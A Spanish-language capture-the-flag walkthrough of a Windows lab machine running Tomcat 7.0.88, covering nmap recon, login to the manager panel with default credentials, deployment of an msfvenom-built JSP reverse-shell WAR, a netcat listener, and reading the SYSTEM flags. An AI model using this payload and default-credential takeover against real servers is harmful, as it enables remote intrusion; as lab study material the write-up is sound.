## Summary

Tags: #Windows #Tomcat #Msfvenom #ReverShell 

- IP -> 10.10.10.95
- Ports -> TCP (8080), UDP (idk)
- OS ->  Windows
- Services & Applications
    - 8080 -> Apache Tomcat 

## Launchpad

-   **Launchpad**: [https://launchpad.net/ubuntu](https://launchpad.net/ubuntu)

## Recon

```bash 
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn ❮Target IP❯  -oG allPorts       # Escaneo en la Capa 4 del modelo OSI
```

```bash
❯ nmap -sCV -p22,... ❮Target IP❯ -oN targeted
```

```bash
❯ whatweb ❮http://IP❯                  # Nos dara una breve descripcion del gestor de contenidos del puerto 80

	# Mirar la jQuery
	# Servidor Web
# Escaneamos el unico puerto que es el 8080
```

Ahora vamos a la pagina web a ver el contenido de Tomcat 
* Tomcat 7.0.88

Al momento de ir al '**/manager/html**' en la url de la web, nos pide un usuario y una passwd. Colocamos el típico 'admin: admin' pero nos niega el acceso, y nos dirige a la pagina en donde hay un usuario y passwd.  

Cerramos nuestro navegador e introducimos esas credenciales de prueba y logramos entrar al panel del manager. 

* En el panel de manager, encontramos una opción en donde podemos subir un archivo .war, por lo que hacemos lo siguiente:

Creamos nuestro archivo malicioso .war, lo subimos a la web y le damos deploy.
Para poder ejecutarlo, solo debemos de darle clic al 'reverse'
```bash 
❯ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f war -o reverse.war

	# p = Payload
	# LHOST = Local Host (IP Atacante)
	# LPORT = Local Port 'Atacante'
	# f = Formato
	# o = Exportar como 
```

Antes de ejecutar el archivo nos ponemos en escucha
```bash
❯ nc -nlvp 443 
```

## User

## Root

Automáticamente somos
```bash 
'nt autorithy\system'
 
# Nos dirigimos a la ruta de
'C:\Users\Administrator\Desktop\flags'

# Ahi encontraremos un archivo que dice: 2 for the price of 1.txt

❯ type "2 for the price of 1.txt"    # Para poder leer archivos con espacios, debemos de colocarlos entre " " y asi obtenemos las 2 flag
```